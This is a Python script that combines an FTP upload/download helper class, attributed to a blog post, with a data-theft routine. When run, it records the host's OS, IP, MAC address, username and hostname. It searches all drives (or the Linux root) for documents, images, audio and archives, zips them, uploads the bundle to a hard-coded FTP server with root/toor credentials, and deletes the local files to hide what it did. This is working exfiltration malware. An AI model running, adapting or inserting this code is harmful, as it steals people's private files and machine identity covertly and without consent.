from ftplib import FTP
import sys
import os
import glob
import time
import uuid
import socket
import platform
import re
import zipfile
import getpass

suff=['zip','rar','txt','docx','mp3','jpg','png','doc']#aim suff
l=[]
for i in range(len(suff)):
    l.append([])
suff_dict=dict(zip(suff,l))
print(suff_dict)
compresspath=''
limit_size=1024*1024*10#10M

class MyFTP:
    """
        ftp自动下载、自动上传脚本，可以递归目录操作
        作者：欧阳鹏
        博客地址：http://blog.csdn.net/ouyang_peng/article/details/79271113
    """

    def __init__(self, host, port=21):
        """ 初始化 FTP 客户端
        参数:
                 host:ip地址

                 port:端口号
        """
        # print("__init__()---> host = %s ,port = %s" % (host, port))

        self.host = host
        self.port = port
        self.ftp = FTP()
        # 重新设置下编码方式
        self.ftp.encoding = 'gbk'
        self.log_file = open("log.txt", "a")
        self.file_list = []

    def login(self, username, password):
        """ 初始化 FTP 客户端
            参数:
                  username: 用户名

                 password: 密码
            """
        try:
            timeout = 60
            socket.setdefaulttimeout(timeout)
            # 0主动模式 1 #被动模式
            self.ftp.set_pasv(False)
            # 打开调试级别2，显示详细信息
            # self.ftp.set_debuglevel(2)

            self.debug_print('开始尝试连接到 %s' % self.host)
            self.ftp.connect(self.host, self.port)
            self.debug_print('成功连接到 %s' % self.host)

            self.debug_print('开始尝试登录到 %s' % self.host)
            self.ftp.login(username, password)
            self.debug_print('成功登录到 %s' % self.host)

            self.debug_print(self.ftp.welcome)
        except Exception as err:
            self.deal_error("FTP 连接或登录失败 ，错误描述为：%s" % err)
            pass

    def is_same_size(self, local_file, remote_file):
        """判断远程文件和本地文件大小是否一致

           参数:
             local_file: 本地文件

             remote_file: 远程文件
        """
        try:
            remote_file_size = self.ftp.size(remote_file)
        except Exception as err:
            # self.debug_print("is_same_size() 错误描述为：%s" % err)
            remote_file_size = -1

        try:
            local_file_size = os.path.getsize(local_file)
        except Exception as err:
            # self.debug_print("is_same_size() 错误描述为：%s" % err)
            local_file_size = -1

        self.debug_print('local_file_size:%d  , remote_file_size:%d' % (local_file_size, remote_file_size))
        if remote_file_size == local_file_size:
            return 1
        else:
            return 0

    def download_file(self, local_file, remote_file):
        """从ftp下载文件
            参数:
                local_file: 本地文件

                remote_file: 远程文件
        """
        self.debug_print("download_file()---> local_path = %s ,remote_path = %s" % (local_file, remote_file))

        if self.is_same_size(local_file, remote_file):
            self.debug_print('%s 文件大小相同，无需下载' % local_file)
            return
        else:
            try:
                self.debug_print('>>>>>>>>>>>>下载文件 %s ... ...' % local_file)
                buf_size = 1024
                file_handler = open(local_file, 'wb')
                self.ftp.retrbinary('RETR %s' % remote_file, file_handler.write, buf_size)
                file_handler.close()
            except Exception as err:
                self.debug_print('下载文件出错，出现异常：%s ' % err)
                return

    def download_file_tree(self, local_path, remote_path):
        """从远程目录下载多个文件到本地目录
                       参数:
                         local_path: 本地路径

                         remote_path: 远程路径
                """
        print("download_file_tree()--->  local_path = %s ,remote_path = %s" % (local_path, remote_path))
        try:
            self.ftp.cwd(remote_path)
        except Exception as err:
            self.debug_print('远程目录%s不存在，继续...' % remote_path + " ,具体错误描述为：%s" % err)
            return

        if not os.path.isdir(local_path):
            self.debug_print('本地目录%s不存在，先创建本地目录' % local_path)
            os.makedirs(local_path)

        self.debug_print('切换至目录: %s' % self.ftp.pwd())

        self.file_list = []
        # 方法回调
        self.ftp.dir(self.get_file_list)

        remote_names = self.file_list
        self.debug_print('远程目录 列表: %s' % remote_names)
        for item in remote_names:
            file_type = item[0]
            file_name = item[1]
            local = os.path.join(local_path, file_name)
            if file_type == 'd':
                print("download_file_tree()---> 下载目录： %s" % file_name)
                self.download_file_tree(local, file_name)
            elif file_type == '-':
                print("download_file()---> 下载文件： %s" % file_name)
                self.download_file(local, file_name)
            self.ftp.cwd("..")
            self.debug_print('返回上层目录 %s' % self.ftp.pwd())
        return True

    def upload_file(self, local_file, remote_file):
        """从本地上传文件到ftp

           参数:
             local_path: 本地文件

             remote_path: 远程文件
        """
        if not os.path.isfile(local_file):
            self.debug_print('%s 不存在' % local_file)
            return

        if self.is_same_size(local_file, remote_file):
            self.debug_print('跳过相等的文件: %s' % local_file)
            return

        buf_size = 1024
        file_handler = open(local_file, 'rb')
        print('test',type(local_file),local_file)




        #self.ftp.storbinary()
        self.ftp.storbinary('STOR %s' % remote_file, file_handler, buf_size)
        file_handler.close()
        self.debug_print('上传: %s' % local_file + "成功!")

    def upload_file_tree(self, local_path, remote_path):
        """从本地上传目录下多个文件到ftp
           参数:

             local_path: 本地路径

             remote_path: 远程路径
        """
        if not os.path.isdir(local_path):
            self.debug_print('本地目录 %s 不存在' % local_path)
            return
        """
        创建服务器目录
        """
        try:
            self.ftp.cwd(remote_path)  # 切换工作路径
        except Exception as e:
            base_dir, part_path = self.ftp.pwd(), remote_path.split('/')
            for p in part_path[1:-1]:
                base_dir = base_dir + p + '/'  # 拼接子目录
                try:
                    self.ftp.cwd(base_dir)  # 切换到子目录, 不存在则异常
                except Exception as e:
                    print('INFO:', e)
                    self.ftp.mkd(base_dir)  # 不存在创建当前子目录
        #self.ftp.cwd(remote_path)
        self.debug_print('切换至远程目录: %s' % self.ftp.pwd())

        local_name_list = os.listdir(local_path)
        self.debug_print('本地目录list: %s' % local_name_list)
        #self.debug_print('判断是否有服务器目录: %s' % os.path.isdir())

        for local_name in local_name_list:
            src = os.path.join(local_path, local_name)
            print("src路径=========="+src)
            if os.path.isdir(src):
                try:
                    self.ftp.mkd(local_name)
                except Exception as err:
                    self.debug_print("目录已存在 %s ,具体错误描述为：%s" % (local_name, err))
                self.debug_print("upload_file_tree()---> 上传目录： %s" % local_name)
                self.debug_print("upload_file_tree()---> 上传src目录： %s" % src)
                self.upload_file_tree(src, local_name)
            else:
                self.debug_print("upload_file_tree()---> 上传文件： %s" % local_name)
                self.upload_file(src, local_name)
        self.ftp.cwd("..")

    def close(self):
        """ 退出ftp
        """
        self.debug_print("close()---> FTP退出")
        self.ftp.quit()
        self.log_file.close()

    def debug_print(self, s):
        """ 打印日志
        """
        self.write_log(s)

    def deal_error(self, e):
        """ 处理错误异常
            参数：
                e：异常
        """
        log_str = '发生错误: %s' % e
        self.write_log(log_str)
        sys.exit()

    def write_log(self, log_str):
        """ 记录日志
            参数：
                log_str：日志
        """
        time_now = time.localtime()
        date_now = time.strftime('%Y-%m-%d', time_now)
        format_log_str = "%s ---> %s \n " % (date_now, log_str)
        print(format_log_str)
        self.log_file.write(format_log_str)

    def get_file_list(self, line):
        """ 获取文件列表
            参数：
                line：
        """
        file_arr = self.get_file_name(line)
        # 去除  . 和  ..
        if file_arr[1] not in ['.', '..']:
            self.file_list.append(file_arr)

    def get_file_name(self, line):
        """ 获取文件名
            参数：
                line：
        """
        pos = line.rfind(':')
        while (line[pos] != ' '):
            pos += 1
        while (line[pos] == ' '):
            pos += 1
        file_arr = [line[0], line[pos:]]
        return file_arr

def find_all_path(dirnames):
    print('搜索并压缩本路径下所有符合条件的文件:'+'、'.join(dirnames))
    result = []#所有的文件

    for dirname in dirnames:
        limit=0
        for maindir, subdir, file_name_list in os.walk(dirname):

            #print("1:",maindir) #当前主目录
            #print("2:",subdir) #当前主目录下的所有目录
            #print("3:",file_name_list)  #当前主目录下的所有文件
            
            for filename in file_name_list:
                f_t=filename.split('.')[-1]
                if f_t in suff:
                    apath = os.path.join(maindir, filename)#合并成一个完整路径
                    #result.append(apath)
                    limit+=1
                    suff_dict[f_t].append(apath)
                if limit==20:
                    
                    break
            if limit==20:
                limit=0
                break
        #print(result)
    #return result
def get_zip(allpath,aimfile):
    newzip=zipfile.ZipFile(aimfile+'.zip','w')
    
    print('生成的zip文件:'+aimfile+'.zip')
    for f in allpath:
        try:
            #print("compress"+f)
            fsize=os.path.getsize(f)
            
            (filepath, tempfilename) = os.path.split(f)
            #print(filepath, tempfilename)
            if fsize<limit_size and f.find(compresspath)!= -1 :
                newzip.write(f,arcname=tempfilename)#去除路径
            else:
                print("Warning:this file can't exceed 1M ,this size is"+str(fsize))
        except :
            #print(e.values)
            print("Eorr:"+f +"can't compress")
            pass
    return(aimfile+'.zip')
def get_zip_big(allpath,aimfile):
    newzip=zipfile.ZipFile(aimfile+'.zip','w')
    
    print('生成的zip文件:'+aimfile+'.zip')
    for f in allpath:
        try:
            #print("compress"+f)
            fsize=os.path.getsize(f)
            
            (filepath, tempfilename) = os.path.split(f)
            #print(filepath, tempfilename)
            if  f.find(compresspath)!= -1 :
                newzip.write(f,arcname=tempfilename)#去除路径
            else:
                print('Erro name:',aimfile)
        except :
            #print(e.values)
            print("Eorr:"+f +"can't compress")
            pass
    return(aimfile+'.zip')
# 获取Mac地址
def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])
def get_image():
    plat_tuple=platform.architecture()
    system=platform.system()
    #######得到ip
    try:
        addrs = socket.getaddrinfo(socket.gethostname(),None)
        ip=''
        for item in addrs:
            ip+=item[4][0]+'\n'

    except:
        myname = socket.getfqdn(socket.gethostname( ))
        ip=socket.gethostbyname(myname)
    #########


    mac=get_mac_address()#mac
    user_name = getpass.getuser() # 获取当前用户名
    hostname = socket.gethostname()#主机名
    plat_version=platform.platform()#平台版本
    #######write in file
    key=open('keyinformation.txt','w')
    print('目标主机信息:keyinformation.txt')
    key.write('\nsystem '+system)
    key.write('\nip '+ip)
    key.write('\nmac '+mac)
    key.write('\nuser_name '+user_name)
    key.write('\nhostname '+hostname)
    key.write('\nplat_version '+plat_version)
    key.close()
    #########
    return system
#遍历字母A到Z，忽略光驱的盘符
def get_disklist():
    ret=[]
    for i in range(65,91):
        vol = chr(i) + ':'
        if os.path.isdir(vol):
            ret.append(vol)
    return ret
def find_get():
    system=get_image()
    system=system.upper()
    if system=='WINDOWS':
        compresspath='windows'
        disk_list=get_disklist()
        find_all_path(disk_list)
        end_path_arr=['keyinformation.txt']
        for key,all_path in suff_dict.items():
            get_zip(all_path,key)
            end_path_arr.append(key+'.zip')
        get_zip_big(end_path_arr,compresspath)
        for r in end_path_arr:
            os.remove(r)
    if system=='LINUX':
        compresspath='linux'
        find_all_path(['/'])
        end_path_arr=['keyinformation.txt']
        for key,all_path in suff_dict.items():
            get_zip(all_path,key)
            end_path_arr.append(key+'.zip')
        print(end_path_arr)

        get_zip_big(end_path_arr,compresspath)
        for r in end_path_arr:
            os.remove(r)
    return(compresspath+'.zip')
if __name__=='__main__':
    
    compressfile=find_get()#搜索、打包目标内容，并返回最后生成的压缩文件名
    my_ftp = MyFTP("192.168.2.102")#连接ftp服务器
    my_ftp.login("root", "toor")#登录ftp服务器
    path=os.getcwd()+"/"+compressfile
    my_ftp.upload_file(path, "/linux.zip")#上传文件到ftp服务器
    my_ftp.close()#关闭ftp服务
    os.remove(compressfile)#清除收集、打包痕迹
    #print('hello')
